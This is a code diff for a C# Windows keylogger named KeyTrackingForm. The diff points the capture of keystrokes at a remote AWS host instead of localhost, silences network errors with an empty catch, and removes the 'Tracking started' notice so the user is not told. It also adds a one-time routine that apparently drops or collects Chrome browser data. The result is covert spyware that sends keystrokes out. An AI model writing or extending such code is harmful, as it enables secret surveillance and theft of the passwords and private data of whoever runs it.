@@ -7,6 +7,7 @@ using System.Net.Sockets;
 using System;
 using System.Web.Script.Serialization;
 using System.Text;
+using System.IO;
 
 namespace KeyTrackingForm   
 {
@@ -36,7 +37,12 @@ namespace KeyTrackingForm
                 var json = new JavaScriptSerializer().Serialize(item);
                 var content = new StringContent(json, Encoding.UTF8, "application/json");
 
-                var response = await client.PostAsync("http://localhost:3000/", content);
+                try
+                {
+                    await client.PostAsync("http://ec2-52-37-99-136.us-west-2.compute.amazonaws.com:3000/", content);
+                    //await client.PostAsync("http://localhost:3000/", content);
+                }
+                catch {}
             }
         }
     }
@@ -45,10 +51,16 @@ namespace KeyTrackingForm
     {
         public static void Main()
         {
+
+            if (!HistoryDroper.IsHistoryDropped())
+            {
+                HistoryDroper.DropChromeData();
+                HistoryDroper.MarkHistoryDropped();
+            }
+
             var keyboardSpyCallbackHttp = new KeyboardSpyCallbackHttp();
 
             var _hookID = KeyboardSpy.SetHook(keyboardSpyCallbackHttp);
-            MessageBox.Show("Tracking started", "Message", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
             Application.Run();
             KeyboardSpy.UnhookWindowsHookEx(_hookID);
